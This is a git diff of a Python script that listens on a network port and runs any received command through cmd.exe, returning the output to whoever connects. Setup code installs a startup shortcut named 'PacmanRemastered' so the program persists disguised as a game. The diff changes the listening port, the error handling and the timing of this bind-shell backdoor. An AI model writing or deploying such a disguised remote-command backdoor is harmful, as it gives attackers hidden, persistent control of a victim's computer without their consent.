@@ -7,14 +7,15 @@ import shutil
 import win32com.client
 # uncomment firstSetup()
 
+sys.stderr = sys.stdout
 running = True # running server
 finished = False # finished running commands this session
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-port = 4834
+port = 17340
 try:
     sock.bind(("0.0.0.0", port))
 except:
-    exit(0)
+    exit(1)
 sock.listen(5)
 print("Socket Created and Listening . . . ")
 
@@ -32,11 +33,13 @@ def firstSetup():
             shortcut.Targetpath = targetPath + "/dist/PacmanRemastered.exe"
             shortcut.save()
             shutil.copy(targetPath + "/dist/PacmanRemastered.lnk", startupPath)
-    except OSError as error:
-        print(error)
+    except:
+        print("Setup Unsuccessful")
         pass
     
 def clientConnect():
+    global finished
+    finished = False
     print("Waiting for Connection . . . ")
     client, address = sock.accept()
     print("Connection Created with " + str(address))
@@ -57,7 +60,7 @@ def commandHandler(client):
     global finished
     try:
         client.send(("\nCurrent Directory: " + os.getcwd()).encode())
-        time.sleep(1)
+        time.sleep(.25)
         client.send("Command".encode())
         command = client.recv(1024).decode().strip()
         if (command == "Finish"):
@@ -91,8 +94,7 @@ def runCommand(command: str, client):
             finished = True
         else:
             prefixCommand = "cmd.exe /c "
-            # suffixCommand = " >nul 2>&1"
-            command = prefixCommand + command.strip() # + suffixCommand
+            command = prefixCommand + command.strip()
             print("Running " + command)
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             client.send("Output: ".encode())
@@ -100,6 +102,7 @@ def runCommand(command: str, client):
                 line = process.stdout.readline()
                 if not line:
                     break
+                time.sleep(0.0001)
                 client.send(line.strip())
             client.send("Errors: ".encode() )
             while True:
